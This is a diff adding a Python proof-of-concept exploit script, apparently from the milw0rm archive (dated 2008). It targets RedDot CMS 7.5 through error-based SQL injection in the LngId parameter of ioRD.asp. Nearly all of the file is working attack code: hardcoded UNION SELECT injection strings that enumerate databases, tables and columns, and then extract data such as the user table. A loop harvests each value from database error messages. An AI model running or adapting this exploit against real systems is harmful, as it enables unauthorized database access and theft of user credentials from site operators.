@@ -1,0 +1,154 @@
+#!/usr/bin/env python
+
+# un-comment your selection.
+
+import urllib2
+import urllib
+import string
+import getopt
+import sys
+
+def banner():
+	print
+	print "RED DOT CMS 7.5 database enumeration"
+	print "by Mark Crowther and Rodrigo Marcos"
+
+def usage():
+	print
+	print "usage():"
+	print "python RD_POC.py [options] URL"
+	print
+	print " [options]"
+	print "		--dbenum: Database enumeration"
+	print "		--tableenum: Table enumeration, use -d to specify database"
+	print "		--colenum: Column enumeration, use -d to specify database and -t to specify table"
+	print "		--dataenum: Data enumeration, use -d to specify database, -t to specify table and -c to specify a column"
+	print "		-d: Specify a database"
+	print "		-t: Specify a table"
+	print "		-c: Specify a column"
+	print "		-h: Help page"
+	print
+	print "Examples: "
+	print "		python RD_POC.py --dbenum http://myhost/cms/"
+	print "		python RD_POC.py --tableenum -d IoAdministration http://myhost/cms/"
+	print "		python RD_POC.py --colenum -d IoAdministration -t IO_USR http://myhost/cms/"
+	print "		python RD_POC.py --dataenum -d IoAdministration -t IO_USR -c USR2 http://myhost/cms/"
+	print
+	sys.exit()
+
+def retrievedata(url1, url2 = "' ORDER BY 1;-- &DisableAutoLogin=1"):
+	stop = 0
+
+	current = ''
+
+	while (stop==0):
+
+		request = url1 + current + url2
+
+		request = string.replace(request, ' ', '%20')
+		req = urllib2.Request(request)
+		try:
+			r = urllib2.urlopen(req)
+		except urllib2.URLError, msg:
+			print "[+] Error: Error requesting URL (%s)" % msg
+		result = r.read()
+
+		#print result
+		if string.find(result, ' Description  Conversion failed when converting the ') == -1:
+			stop = 1
+		else:
+			start = string.find(result, "'") + 1
+			end = string.find(result[start:], "'") + start
+			current = result[start:end]
+			print current
+
+
+def dbenum():
+
+	retrievedata(url + "/ioRD.asp?Action=ShowMessage&LngId=ENG.DGC0 FROM IO_DGC_ENG UNION SELECT min(name) FROM SYS.SYSDATABASES where name> '")
+
+def tableenum(database=''):
+
+	if database=='':
+		retrievedata(url + "/ioRD.asp?Action=ShowMessage&LngId=ENG.DGC0 FROM IO_DGC_ENG UNION SELECT min(name) FROM SYSOBJECTS where xtype=char(85) and name> '")
+
+	else:
+		retrievedata(url + "/ioRD.asp?Action=ShowMessage&LngId=ENG.DGC0 FROM IO_DGC_ENG UNION SELECT min(name) FROM " + database + "..SYSOBJECTS where xtype=char(85) and name> '")
+
+def colenum(table, database=''):
+
+	if table=='':
+		usage()
+
+	if database=='':
+		retrievedata(url + "/ioRD.asp?Action=ShowMessage&LngId=ENG.DGC0 FROM IO_DGC_ENG UNION SELECT min(name) FROM SYSCOLUMNS where name > '", "' AND id = (SELECT id from SYSOBJECTS WHERE name= '" + table + "') ORDER BY 1;-- &DisableAutoLogin=1")
+	else:
+		retrievedata(url + "/ioRD.asp?Action=ShowMessage&LngId=ENG.DGC0 FROM IO_DGC_ENG UNION SELECT min(name) FROM " + database + "..SYSCOLUMNS where name > '","' AND id = (SELECT id from " + database + "..SYSOBJECTS WHERE name= '" + table + "') ORDER BY 1;-- &DisableAutoLogin=1")
+
+
+def dataenum(column, table, database=''):
+
+	if column=='' or table=='':
+		usage()
+
+	if database=='':
+		retrievedata(url + "/ioRD.asp?Action=ShowMessage&LngId=ENG.DGC0 FROM IO_DGC_ENG UNION SELECT MIN(" + column + ") FROM " + table + " WHERE " + column + "> '")
+	
+	else:
+		retrievedata(url + "/ioRD.asp?Action=ShowMessage&LngId=ENG.DGC0 FROM IO_DGC_ENG UNION SELECT MIN(" + column + ") FROM " + database + ".." + table + " WHERE " + column + "> '")
+
+
+banner()
+pdbenum = 0
+ptableenum = 0
+pcolenum = 0
+pdataenum = 0
+database = ''
+table = ''
+column = ''
+
+url =  sys.argv[len(sys.argv)-1]
+
+try:
+	opts, args = getopt.getopt(sys.argv[1:], "d:t:c:h:", ["help", "dbenum", "tableenum", "colenum", "dataenum"])
+except getopt.GetoptError:
+	usage()
+
+try:
+	for o, a in opts:
+		if o in ("-h", "--help"):
+			usage()
+		if o == "--dbenum":
+			pdbenum = 1
+		if o == "--tableenum":
+			ptableenum = 1
+		if o == "--colenum":
+			pcolenum = 1
+		if o == "--dataenum":
+			pdataenum = 1
+		if o == "-d":
+			database = a
+		if o == "-t":
+			table = a
+		if o == "-c":
+			column = a
+except:
+	usage()
+
+
+if pdbenum == 1:
+	print 'Enumerating databases:'
+	dbenum()
+elif ptableenum == 1:
+	print 'Enumerating tables:'
+	tableenum(database)
+elif pcolenum == 1:
+	print 'Enumerating columns:'
+	colenum(table, database)
+elif pdataenum == 1:
+	print 'Enumerating data:'
+	dataenum(column, table, database)
+else:
+	usage()
+
+# milw0rm.com [2008-04-21]
